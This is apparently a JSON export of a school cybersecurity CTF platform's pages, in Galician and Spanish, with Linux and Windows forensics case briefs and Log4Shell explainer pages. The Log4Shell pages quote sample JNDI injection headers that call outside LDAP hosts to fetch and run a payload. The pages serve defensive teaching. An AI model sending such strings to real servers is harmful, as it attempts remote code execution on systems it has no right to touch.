{"count":7,"results":[{"id":1,"title":"None","route":"index","content":"<div class=\"row\">\r\n    <div class=\"col-md-10\">\r\n        <img class=\"w-100 mx-auto d-block\" style=\"max-width: 500x;padding: 20px;padding-top: 7vh;\" src=\"/files/b4676f992bf6e0e39b40fbcbedf1ce79/mafia_color.gif\" />\r\n<h1 class=\"text-center\">\r\n        <p>Forense en Windows</p> \r\n</h1>\r\n<h2 class=\"text-center\">\r\n  <p>Inicio: 17/02/2023 - 15:30 horas</p>\r\n<hr>\r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>\r\n       <h6 class=\"text-center\">Email de contacto: ciberseguridade @ iessanclemente.net</h6>\r\n    </div>\r\n</div>","draft":0,"hidden":0,"auth_required":0,"format":"html"},{"id":2,"title":"Caso#1","route":"forense_en_linux","content":"<h3 class=\"text-center\">\r\n            <p>An\u00e1lise forense en Linux</p>\r\n</h3>\r\n \t \r\nSobre as 17:07 UTC do d\u00eda 26 de xu\u00f1o salta unha alarma no noso sistema de monitorizaci\u00f3n sobre unha das m\u00e1quinas que temos na nosa rede interna. Crese que poder\u00eda estar comprometida e que os atacantes ter\u00edan conseguido algunha sesi\u00f3n que a\u00ednda est\u00e1 aberta. O ataque parece que poder\u00eda estar realizado desde unha m\u00e1quina da nosa rede interna.\r\n\r\nInmediatamente real\u00edzase un envorcado da memoria RAM do equipo comprometido e env\u00edase mediante netcat a outra m\u00e1quina da rede (10.2.0.9). Despois ap\u00e1gase a m\u00e1quina e real\u00edzase unha imaxe completa do disco duro en formato EnCase.\r\n\r\nEfect\u00faase, ademais, un interrogatorio entre os  usuarios \u201cautorizados\u201d do devandito equipo e ningu\u00e9n entre as 16:15 e a hora en que se realizou a adquisici\u00f3n conectouse a el, nin de forma local nin remota.\r\n\r\nP\u00eddeseche que realices unha an\u00e1lise de evidencias, detectes os vectores de entrada ao sistema e as acci\u00f3ns realizadas polos atacantes e xeres unha li\u00f1a temporal das acci\u00f3ns detectadas. \r\n\r\nNota: Para simplificar \u00e1 an\u00e1lise podemos descartar calquera evidencia anterior \u00e1s 16:15 UTC.\r\n\r\nEvidencias aportadas:\r\n- Captura de memoria RAM.\r\n- Perfil de memoria do equipo para o seu traballo con volatility (Ubuntu_3.13.0-24-generic_profile.zip).\r\n- Imaxe do disco duro en formato EnCase.\r\n\r\nDescarga de evidencias:\r\n- <a href=\"https://drive.google.com/file/d/1jTDBAopaXcUZb551nkdHHSExZ1zI8_vB/view?usp=share_link\" target=\"_blank\">mirror1</a>\r\n- <a href=\"https://drive.google.com/file/d/1D5CGbl7QRXA1XRZ_XvlbYZHPf0eTJX1W/view?usp=sharing\" target=\"_blank\">mirror2</a>\r\n- <a href=\"https://drive.google.com/file/d/1o3KVb7U4iONfHtJrUMjmU-_9U8UQYs6x/view?usp=sharing\" target=\"_blank\">mirror3</a>\r\n\r\n---\r\n---\r\n\r\nSobre las 17:07 UTC del d\u00eda 26 de junio salta una alarma en nuestro sistema de monitorizaci\u00f3n sobre una de las m\u00e1quinas que tenemos en nuestra red interna. Se cree que podr\u00eda estar comprometida y que los atacantes habr\u00e1n conseguido alguna sesi\u00f3n que todav\u00eda est\u00e1 abierta. El ataque parece que podr\u00eda estar realizado desde una m\u00e1quina de nuestra red interna.\r\n\r\nDe inmediato se realiza un volcado de la memoria RAM del equipo comprometido y se env\u00eda mediante netcat a otra m\u00e1quina de la red (10.2.0.9). Despu\u00e9s se apaga la m\u00e1quina y se realiza una imagen completa del disco duro en formato EnCase.\r\n\r\nSe efectua, adem\u00e1s, un interrogatorio entre los  usuarios \u201cautorizados\u201d del dicho equipo; y ninguno entre las 16:15 y la hora en que se realiz\u00f3 la adquisici\u00f3n se conect\u00f3 a el, ni de forma local ni remota.\r\n\r\nSe te pide que realices un an\u00e1lisis de evidencias, detectes los vectores de entrada al sistema y las acciones realizadas por los atacantes y generes una l\u00ednea temporal de las acciones detectadas. \r\n\r\nNota: Para simplificar el an\u00e1lisis podemos descartar cualquier evidencia anterior a las 16:15 UTC.\r\n\r\nEvidencias aportadas:\r\n- Captura de memoria RAM.\r\n- Perfil de memoria do equipo para su trabajo con volatility (Ubuntu_3.13.0-24-generic_profile.zip).\r\n- Imagen del disco duro en formato EnCase.\r\n\r\nDescarga de evidencias:\r\n- <a href=\"https://drive.google.com/file/d/1jTDBAopaXcUZb551nkdHHSExZ1zI8_vB/view?usp=share_link\" target=\"_blank\">mirror1</a>\r\n- <a href=\"https://drive.google.com/file/d/1D5CGbl7QRXA1XRZ_XvlbYZHPf0eTJX1W/view?usp=sharing\" target=\"_blank\">mirror2</a>\r\n- <a href=\"https://drive.google.com/file/d/1o3KVb7U4iONfHtJrUMjmU-_9U8UQYs6x/view?usp=sharing\" target=\"_blank\">mirror3</a>\r\n\r\n<br>\r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>","draft":0,"hidden":1,"auth_required":0,"format":"markdown"},{"id":7,"title":"Log4Shell: CVE-2021-44228","route":"log4shell","content":"### Log4Shell\r\n\r\nO 9 de decembro de 2021 faise p\u00fablica a vulnerabilidade **CVE-2021-44228** (tam\u00e9n co\u00f1ecida como **Log4shell**). Tr\u00e1tase dunha vulnerabilidade que **permite a execuci\u00f3n remota de c\u00f3digo (RCE)**, que afecta \u00e1 librer\u00eda de software de c\u00f3digo aberto Log4j, desenvolta en linguaxe Java, mantida por *Apache Software Foundation* e moi utilizada no software empresarial Java para a escritura de logs.\r\n\r\nDebido ao amplo uso de Log4j, o sinxelo que \u00e9 explotar a vulnerabilidade e que permite ao atacante a execuci\u00f3n de comandos no equipo afectado (para ga\u00f1ar privilexios de administrador,  exfiltrar informaci\u00f3n, minado de  criptomonedas, \u2026), consid\u00e9rase \u00e1 CVE-2021-44288 como unha **vulnerabilidade de nivel cr\u00edtico**.\r\n\r\nOs atacantes lanzan petici\u00f3ns maliciosas coa seguinte estrutura: `${jndi:ldap://<servidor do atacante>/<payload>}` ou `${jndi:dns://<servidor do atacante>/<payload>}`. Este tipo de petici\u00f3ns ao ser procesadas por Log4j provocan que o equipo v\u00edtima con\u00e9ctase ao servidor do atacante, descarga o payload e exec\u00fatao. A continuaci\u00f3n p\u00f3dense ver alg\u00fans exemplos de petici\u00f3ns maliciosas incrustadas en campos do protocolo HTTP:\r\n  \r\n`User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`\r\n  \r\n  `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`\r\n\r\nTras a publicaci\u00f3n da vulnerabilidade, o GovCERT.ch (Computer Emergency Response Team) de Su\u00edza publicou a seguinte imaxe que resume o proceso de ataque e as medidas de defensa: \r\n  \r\n<h3 class=\"text-center\">\r\n  <img class=\"w-100 mx-auto d-block\" style=\"max-width: 1024px;padding: 5px;\" src=\"/files/6687ee0328271c73a99ca098d685fb6c/log4shell.png\" /></h3>\r\n<hr>\r\n\r\nEl 9 de diciembre de 2021 se hace p\u00fablica la vulnerabilidad **CVE-2021-44228** (tambi\u00e9n conocida como **Log4shell**). Se trata de una vulnerabilidad que **permite la ejecuci\u00f3n remota de c\u00f3digo (RCE)**, que afecta a la librer\u00eda de software de c\u00f3digo abierto Log4j, desarrollada en lenguaje Java, mantenida por Apache Software Foundation y muy utilizada en el software empresarial Java para la escritura de logs. Debido al amplio uso de Log4j, lo sencillo que es explotar la vulnerabilidad y que permite al atacante la ejecuci\u00f3n de comandos en el equipo afectado (para ganar privilegios de administrador, exfiltrar informaci\u00f3n, minado de criptomonedas, \u2026), se considera a CVE-2021-44288 como una **vulnerabilidad de nivel cr\u00edtico**.\r\n\r\nLos atacantes lanzan peticiones maliciosas con la siguiente estructura: `${jndi:ldap://<servidor del atacante>/<payload>}` o `${jndi:dns://<servidor do atacante>/<payload>}`. Este tipo de peticiones al ser procesadas por Log4j provocan que el equipo v\u00edctima se conecte al servidor LDAP del atacante, se descargue el payload y lo ejecute. A continuaci\u00f3n se pueden ver algunos ejemplos de peticiones maliciosas incrustadas en campos del protocolo HTTP:\r\n  \r\n`User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`\r\n  \r\n  `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`\r\n\r\nTras la publicaci\u00f3n de la vulnerabilidad, el GovCERT.ch (Computer Emergency Response Team) de Suiza public\u00f3 la anterior imagen que resume el proceso de ataque y las medidas de defensa\r\n  \r\n  \r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>\r\n   <h6 class=\"text-center\">Email de contacto: ciberseguridade @ iessanclemente.net</h6>","draft":0,"hidden":1,"auth_required":0,"format":"markdown"},{"id":8,"title":"index_original","route":"index_original","content":"<div class=\"row\">\r\n    <div class=\"col-md-6 offset-md-3\">\r\n        <img class=\"w-100 mx-auto d-block\" style=\"max-width: 500px;padding: 50px;padding-top: 14vh;\" src=\"/themes/core/static/img/logo.png?d=2181ced8\" />\r\n        <h3 class=\"text-center\">\r\n            <p>A cool CTF platform from <a href=\"https://ctfd.io\">ctfd.io</a></p>\r\n            <p>Follow us on social media:</p>\r\n            <a href=\"https://twitter.com/ctfdio\"><i class=\"fab fa-twitter fa-2x\" aria-hidden=\"true\"></i></a>&nbsp;\r\n            <a href=\"https://facebook.com/ctfdio\"><i class=\"fab fa-facebook fa-2x\" aria-hidden=\"true\"></i></a>&nbsp;\r\n            <a href=\"https://github.com/ctfd\"><i class=\"fab fa-github fa-2x\" aria-hidden=\"true\"></i></a>\r\n        </h3>\r\n        <br>\r\n        <h4 class=\"text-center\">\r\n            <a href=\"admin\">Click here</a> to login and setup your CTF\r\n        </h4>\r\n    </div>\r\n</div>","draft":0,"hidden":1,"auth_required":0,"format":"markdown"},{"id":9,"title":"pruebas_varias","route":"pruebas_varias","content":"![forense4_op_red.gif](/files/ed63abc72998874c6c7a026b35fd7a97/forense4_op_red.gif)\r\n\r\n\r\n<h3 class=\"text-center\">\r\n            <p>Log4Shell</p>\r\n</h3>\r\n \t \r\nEl 9 de diciembre de 2021 se hace p\u00fablica la vulnerabilidad CVE-2021-44228 (tambi\u00e9n conocida como Log4shell). Se trata de una vulnerabilidad que permite la ejecuci\u00f3n remota de c\u00f3digo (RCE), que afecta a la librer\u00eda de software de c\u00f3digo abierto Log4j, desarrollada en lenguaje Java, mantenida por Apache Software Foundation y muy utilizada en el software empresarial Java para la escritura de logs. Debido al amplio uso de Log4j, lo sencillo que es explotar la vulnerabilidad y que permite al atacante la ejecuci\u00f3n de comandos en el equipo afectado (para ganar privilegios de administrador, exfiltrar informaci\u00f3n, minado de criptomonedas, \u2026), se considera a CVE-2021-44288 como una vulnerabilidad de nivel cr\u00edtico.\r\n\r\nComo analista del SOC (Security Operations Center) haz una investigaci\u00f3n del tr\u00e1fico de red para determinar si hubo incidentes relativos a Log4shell en tu organizaci\u00f3n. \r\n\r\nUsa tus conocimientos de Wireshark, investiga el incidente y recuerda que los atacantes lanzan peticiones maliciosas con la siguiente estructura: `${jndi:ldap://<servidor del atacante>/<payload>}`. Este tipo de peticiones al ser procesadas por Log4j provocan que el equipo v\u00edctima se conecte al servidor LDAP del atacante, se descargue el payload y lo ejecute. A continuaci\u00f3n se pueden ver algunos ejemplos de peticiones maliciosas incrustadas en campos del protocolo HTTP:\r\n  \r\n`User-Agent: ${jndi:ldap://2.57.121.36:8000/mss}`\r\n  \r\n  `Cookie: ${jndi:ldap://45.83.64.1/securityscan-3g32njrlbok56r5i}`\r\n\r\nTras la publicaci\u00f3n de la vulnerabilidad, el GovCERT.ch (Computer Emergency Response Team) de Suiza public\u00f3 la siguiente imagen que resume el proceso de ataque y las medidas de defensa:\r\n \r\n![log4shell](/files/6687ee0328271c73a99ca098d685fb6c/log4shell.png)\r\n<h3 class=\"text-center\">\r\n  <img class=\"w-100 mx-auto d-block\" style=\"max-width: 1024px;padding: 5px;\" src=\"/files/6687ee0328271c73a99ca098d685fb6c/log4shell.png\" /></h3>\r\n  <h3 class=\"text-center\">\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n  </h3>\r\n\r\n  <table align=\"center\" cellspacing=\"100\">\r\n   <tr>\r\n     <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 225px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n     <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 225px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n    </tr>\r\n</table>\r\n        <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>\r\n  <h6 class=\"text-center\">Email de contacto: ciberseguridade @ iessanclemente.net</h6>\r\n  \r\n  \r\n  \r\n  <h2 class=\"text-center\">\r\n     <p>Log4Shell CTF - do 21 \u00f3 27 de xu\u00f1o de 2022</p>\r\n     <p>Data de inicio: 21 de xu\u00f1o \u00e1s 10:00 horas</p>\r\n  </h2>\r\n  <hr>\r\n  <h2 class=\"text-center\">\r\n     <p>Log4Shell CTF - del 21 al 27 de junio de 2022</p>\r\n     <p>Data de inicio: 21 de junio a las 10:00 horas</p>\r\n  </h2>","draft":0,"hidden":1,"auth_required":0,"format":"markdown"},{"id":11,"title":"index_log4shell_backup","route":"","content":"<div class=\"row\">\r\n    <div class=\"col-md-10\">\r\n        <img class=\"w-100 mx-auto d-block\" style=\"max-width: 500px;padding: 50px;padding-top: 14vh;\" src=\"/files/54cd649e34973630a969cd2a35740813/Apache_Log4j_Logo.png\" />\r\n<h2 class=\"text-center\">\r\n          <p>Log4Shell CTF - do 10 \u00f3 20 de novembro de 2022</p>\r\n  <p>Data de inicio: 10 de novembro \u00e1s 00:00 horas</p>\r\n      </h2>\r\n      <hr>\r\n      <h2 class=\"text-center\">\r\n          <p>Log4Shell CTF - del 10 al 20 de noviembre de 2022</p>\r\n  <p>Fecha de inicio: 10 de noviembre a las 00:00 horas</p>\r\n      </h2>\r\n            <hr>\r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>\r\n       <h6 class=\"text-center\">Email de contacto: ciberseguridade @ iessanclemente.net</h6>\r\n    </div>\r\n</div>","draft":0,"hidden":1,"auth_required":0,"format":"markdown"},{"id":12,"title":"Caso#2","route":"forense_en_windows","content":"<h3 class=\"text-center\">\r\n            <p>An\u00e1lise forense en Windows</p>\r\n</h3>\r\n<h4>Parte 1</h4> \t \r\n<p>O ex-piloto de carreiras John Tanner \u00e9 agora un polic\u00eda infiltrado na Mafia de Nova York. O seu capo, o se\u00f1or Castaldi, planea un golpe de forma inminente. Supo\u00f1emos que o elixido para levalo a cabo \u00e9 o implacable asasino a soldo Jean Paul, alias \u201cO Franc\u00e9s\u201d, e que, como de costume, Tanner conducir\u00e1 o coche da fuxida. Con todo, a\u00ednda non sabemos cal \u00e9 o obxectivo.</p>\r\n<p>O que si sabemos \u00e9 que Tanner estivo a manter conversaci\u00f3ns co Sr. Castaldi a trav\u00e9s dunha aplicaci\u00f3n de chat. Por desgraza, dita aplicaci\u00f3n est\u00e1 cifrada cun mecanismo co\u00f1ecido como Double Ratchet, similar ao que usan WhatsApp e os seus competidores e, por tanto, non puidemos intervir ditas comunicaci\u00f3ns.</p>\r\n<p>Agora, Tanner est\u00e1 desaparecido e o seu computador est\u00e1 frito, o cal non \u00e9 de estra\u00f1ar, pois medio FBI e parte da polic\u00eda metropolitana est\u00e1n subornados. Por sorte, pouco antes do golpe, un dos nosos t\u00e9cnicos pasou a Tanner un USB cun programa para executar. Devandito programa, chamado DumpIt, serve para recoller unha imaxe de memoria do equipo. Cando os nosos homes chegaron, o USB estaba no agocho acordado, as\u00ed que quizais os axentes corruptos do FBI non o tocaran. Como era de esperar, al\u00ed hab\u00eda unha imaxe de memoria co \u00faltimo que Tanner executou no computador antes de sa\u00edr. Ademais, como quedaramos, na recepci\u00f3n do hotel de en fronte do seu apartamento deixounos unha nota na cal estaba escrito o c\u00f3digo hash da imaxe creada: a518111a8f288d94fb4fb0069e36a884e1483f72b51b876303b6c7cfcb945715</p>\r\n<h4>Parte 2</h4>\r\n<p>Finalmente uns expertos en hardware lograron rescatar unha imaxe do disco de Tanner. Coa nova informaci\u00f3n adquirida, podemos sacar alg\u00fans datos mais da sua actividade nos \u00faltimos d\u00edas. Os hashes do arquivo son os seguintes:</p>\r\n\r\n- MD5: 8712a3760e8fc801425309852ee1127a ExamenForense.img\r\n- SHA-1: eaa88659a5dd2453527ffee0ccb13447c7223184 ExamenForense.img\r\n- SHA-256: e4216bb636648b7a4188aacef3587c64aabfb05aade76b6070b3ce8d66d4568a ExamenForense.img\r\n\r\n<b>Evidencias aportadas:</b>\r\n- Captura de memoria RAM (DRIVERGAME-20220212-133941.dmp - 2GB).\r\n  - <a href=\"https://drive.google.com/file/d/1JPDaZO9_O38flLWlCYh_o7tXnYK8z81n/view?usp=share_link\" target=\"_blank\">mirror1</a>\r\n  - <a href=\"https://drive.google.com/file/d/1vN3rh1hH1y0WhH5Tnc112GvMES2JKRni/view?usp=share_link\" target=\"_blank\">mirror2</a>\r\n  - <a href=\"https://drive.google.com/file/d/1IAnTFMjqQEtBZue6WOBRjdtGC57EQYX-/view?usp=share_link\" target=\"_blank\">mirror3</a>\r\n- Imaxe disco duro (ExamenForense.img.zip - 7.1GB --> descomprimido 32,0 GB)\r\n  - <a href=\"https://drive.google.com/file/d/1w_KyE2XF8H1N00RAw-4yK-V4medGdFVN/view?usp=share_link\" target=\"_blank\">mirror1</a>\r\n  - <a href=\"https://drive.google.com/file/d/1Z9j7rGjFDyYNvu7DCQUaWlpq0V8qFuSd/view?usp=share_link\" target=\"_blank\">mirror2</a>\r\n  - <a href=\"https://drive.google.com/file/d/1BBsFH_UJdKCvUEZYz4y9sR9FgiVzW5YP/view?usp=share_link\" target=\"_blank\">mirror3</a>\r\n  \r\n---\r\n---\r\n<p>El ex-piloto de carreras John Tanner es ahora un polic\u00eda infiltrado en la Mafia de Nueva York. Su capo, el se\u00f1or Castaldi, planea un golpe de forma inminente. Suponemos que el elegido para llevarlo a cabo es el implacable asesino a sueldo Jean Paul, alias \u201cEl Franc\u00e9s\u201d, y que, como de costumbre, Tanner conducir\u00e1 el coche de la huida. Sin embargo, a\u00fan no sabemos cu\u00e1l es el objetivo.</p>\r\n<p>Lo que s\u00ed sabemos es que Tanner estuvo manteniendo conversaciones con el Sr. Castaldi a trav\u00e9s de una aplicaci\u00f3n de chat. Por desgracia, dicha aplicaci\u00f3n est\u00e1 cifrada con un mecanismo conocido como Double Ratchet, similar al que usan WhatsApp y sus competidores y, por tanto, no hemos podido intervenir dichas comunicaciones.</p>\r\n<p>Ahora, Tanner est\u00e1 desaparecido y su ordenador est\u00e1 frito, lo cual no es de extra\u00f1ar, pues medio FBI y parte de la polic\u00eda metropolitana est\u00e1n sobornados. Por suerte, poco antes del golpe, uno de nuestros t\u00e9cnicos pas\u00f3 a Tanner un USB con un programa para ejecutar. Dicho programa, llamado DumpIt, sirve para recoger una imagen de memoria del equipo. Cuando nuestros hombres llegaron, el USB estaba en el escondrijo acordado, as\u00ed que quiz\u00e1s los agentes corruptos del FBI no lo hayan tocado. Como era de esperar, all\u00ed hab\u00eda una imagen de memoria con lo \u00faltimo que Tanner ejecut\u00f3 en el ordenador antes de salir. Adem\u00e1s, como hab\u00edamos quedado, en la recepci\u00f3n del hotel de enfrente de su apartamento nos dej\u00f3 una nota en la cual estaba escrito el c\u00f3digo hash de la imagen creada: a518111a8f288d94fb4fb0069e36a884e1483f72b51b876303b6c7cfcb945715</p>\r\n<h4>Parte 2</h4>\r\n<p>Finalmente unos expertos en hardware han logrado rescatar una imagen del disco de Tanner. Con la nueva informaci\u00f3n adquirida, podemos sacar algunos datos m\u00e1s de su actividad en los \u00faltimos d\u00edas. Los hashes del archivo son los siguientes:</p>\r\n\r\n- MD5: 8712a3760e8fc801425309852ee1127a ExamenForense.img\r\n- SHA-1: eaa88659a5dd2453527ffee0ccb13447c7223184 ExamenForense.img\r\n- SHA-256: e4216bb636648b7a4188aacef3587c64aabfb05aade76b6070b3ce8d66d4568a ExamenForense.img\r\n\r\n<b>Evidencias aportadas:</b>\r\n- Captura de memoria RAM (DRIVERGAME-20220212-133941.dmp - 2GB).\r\n  - <a href=\"https://drive.google.com/file/d/1JPDaZO9_O38flLWlCYh_o7tXnYK8z81n/view?usp=share_link\" target=\"_blank\">mirror1</a>\r\n  - <a href=\"https://drive.google.com/file/d/1vN3rh1hH1y0WhH5Tnc112GvMES2JKRni/view?usp=share_link\" target=\"_blank\">mirror2</a>\r\n  - <a href=\"https://drive.google.com/file/d/1IAnTFMjqQEtBZue6WOBRjdtGC57EQYX-/view?usp=share_link\" target=\"_blank\">mirror3</a>\r\n- Imagen disco duro (ExamenForense.img.zip - 7.1GB --> descomprimido 32,0 GB)\r\n  - <a href=\"https://drive.google.com/file/d/1w_KyE2XF8H1N00RAw-4yK-V4medGdFVN/view?usp=share_link\" target=\"_blank\">mirror1</a>\r\n  - <a href=\"https://drive.google.com/file/d/1Z9j7rGjFDyYNvu7DCQUaWlpq0V8qFuSd/view?usp=share_link\" target=\"_blank\">mirror2</a>\r\n  - <a href=\"https://drive.google.com/file/d/1BBsFH_UJdKCvUEZYz4y9sR9FgiVzW5YP/view?usp=share_link\" target=\"_blank\">mirror3</a>\r\n\r\n<br>\r\n<h2 class=\"text-center\">\r\n  <p> </p>\r\n    <p><a href=\"https://www.iessanclemente.net/\" target=\"_blank\">IES San Clemente</a> - <a href=\"https://www.cifprodolfoucha.es/\"  target=\"_blank\">CIFP Rodolfo Ucha Pi\u00f1eiro</a></p>\r\n</h2>\r\n<br>\r\n<table align=\"center\" cellspacing=\"50\">\r\n<tr>\r\n    <td><a href=\"https://www.edu.xunta.gal/\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/92b8e91a19738d45564cc8c38c7453a7/logo_xunta_positivo.png\" /></a></td>\r\n    <td><a href=\"https://www.edu.xunta.gal/fp/convocatoria-innovacion-2022\" target=\"_blank\"><img class=\"w-100 mx-auto d-block\" style=\"max-width: 250px;padding: 5px;\" src=\"/files/2d1f8f737672c526021d7f41b6a28622/composicion_formacion_profesional_innova.png\" /></a></td>\r\n</tr>\r\n</table>\r\n      <p> </p>\r\n      <h6>Actividade desenvolvida dentro do proxecto \"Plataforma de retos de ciberseguridade. A gamificaci\u00f3n no proceso de adquisici\u00f3n de competencias no \u00e1mbito da ciberseguridade\", financiado na convocatoria de premios para o desenvolvemento de proxectos de innovaci\u00f3n na FP do ano 2022.</h6>","draft":0,"hidden":0,"auth_required":0,"format":"markdown"}],"meta":{}}